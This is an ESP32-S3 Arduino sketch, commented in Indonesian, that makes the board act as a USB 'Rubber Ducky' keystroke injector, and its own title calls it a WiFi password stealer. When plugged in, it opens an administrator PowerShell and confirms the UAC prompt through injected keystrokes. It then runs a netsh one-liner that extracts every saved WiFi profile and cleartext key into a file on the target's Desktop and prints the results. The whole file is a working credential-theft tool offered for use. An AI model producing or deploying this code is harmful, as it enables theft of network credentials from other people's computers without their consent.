/*
 * ESP32-S3 USB Rubber Ducky - Pencuri Password WiFi
 * Output: File di Desktop target
 * Plug and Play - Colok USB -> Langsung jalan otomatis
 */

#include <USB.h>
#include <USBHIDKeyboard.h>

USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  USB.begin();
  
  delay(4000);
  
  // ===== 1. BUKA POWERSHELL ADMINISTRATOR =====
  Keyboard.press(KEY_LEFT_GUI);
  delay(50);
  Keyboard.press('r');
  delay(50);
  Keyboard.releaseAll();
  delay(500);
  
  Keyboard.print("powershell");
  delay(200);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  
  // Konfirmasi UAC
  Keyboard.press(KEY_LEFT_ALT);
  delay(50);
  Keyboard.press('y');
  delay(50);
  Keyboard.releaseAll();
  delay(3000);
  
  // ===== 2. AMBIL SEMUA PROFIL WIFI + PASSWORD =====
  // Simpan langsung ke file di Desktop
  
  Keyboard.print("$desktop = [Environment]::GetFolderPath('Desktop')");
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.releaseAll();
  delay(500);
  
  Keyboard.print("$file = \"$desktop\\wifi_passwords.txt\"");
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.releaseAll();
  delay(500);
  
  Keyboard.print("\"===== ALL WIFI PROFILES & PASSWORDS =====\" | Out-File -FilePath $file");
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.releaseAll();
  delay(500);
  
  Keyboard.print("netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { $_ -replace '.*: ', '' } | ForEach-Object { \"`nSSID: $_\" | Out-File -FilePath $file -Append; netsh wlan show profile name=$_ key=clear | Select-String 'Key Content' | ForEach-Object { \"Password: $($_ -replace '.*: ', '')\" | Out-File -FilePath $file -Append } }");
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.releaseAll();
  delay(4000); // Tunggu semua profil diproses
  
  // ===== 3. TAMPILKAN HASIL =====
  Keyboard.print("Write-Host \"============================================\" -ForegroundColor Green");
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.releaseAll();
  delay(300);
  
  Keyboard.print("Get-Content $file");
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.releaseAll();
  delay(1000);
  
  Keyboard.print("Write-Host \"============================================\" -ForegroundColor Green");
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.releaseAll();
  delay(300);
  
  Keyboard.print("Write-Host \"File tersimpan di: $file\" -ForegroundColor Yellow");
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.releaseAll();
  delay(2000);
  
  // ===== 4. TUTUP =====
  Keyboard.print("exit");
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.releaseAll();
  
  // ===== SKRIP SELESAI =====
}

void loop() {
  delay(1000);
}
